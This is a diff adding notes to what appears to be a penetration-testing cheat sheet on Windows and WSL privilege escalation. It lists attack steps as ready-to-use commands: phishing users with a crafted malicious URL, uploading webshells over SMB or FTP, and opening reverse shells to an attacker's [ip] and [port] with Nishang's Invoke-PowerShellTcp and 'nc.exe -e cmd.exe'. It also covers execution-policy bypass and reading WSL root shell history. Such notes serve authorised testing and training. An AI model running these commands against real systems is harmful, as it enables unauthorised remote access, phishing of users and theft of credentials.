@@ -142,3 +142,39 @@ Execute commands on a windows system:
 
 ## Escalation Path: Windows Subsystem for Linux
 
+Sending a crafted url payload to another account may have the user click on the malicious url.
+
+Try to upload a webshell when you hav access to smb/ftp.
+
+Enumerate smb: `smbclient \\\\[ip]\\ -L`
+
+Check all fields for SQL injection, code injection, XSS, etc...
+
+Upgrading webshells:
+- Linux: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+- Windows: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+  - Append `Invoke-PowerShellTcp -Reverse -IPAddress [ip] -Port [port]` to the code
+  - Capture a request in BurpSuite
+  - Encode `powershell -ep bypass .\Invoke-PowerShellTcp.ps1`
+- Alternative Windows method
+  - `locate nc.exe`
+  - `cp [path to nc.exe] ~`
+  - `nc.exe -e cmd.exe [ip] [port]`
+
+Escalate using WSL:
+- Check where WSL is installed: `Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss |
+%{Get-ItemProperty $_.PSPath} | out-string -width 4096`
+- Locate to the found directory and go to the `root` directory "`rootfs`".
+- Look inside the `.bash_history` file.
+
+Alternative escalation method
+- `where /R C:\ bash.exe`
+- `where /R C:\ wsl.exe`
+  - `wsl.exe whoami`
+- `bash.exe`
+  - Elevate to a tty shell if needed
+    - `python -c "import pty;pty.spawn('/bin/bash')"`
+    - TTY cheatsheet: https://netsec.ws/?p=337
+  - `ls -la`
+  - `history`
+  - `sudo -l`
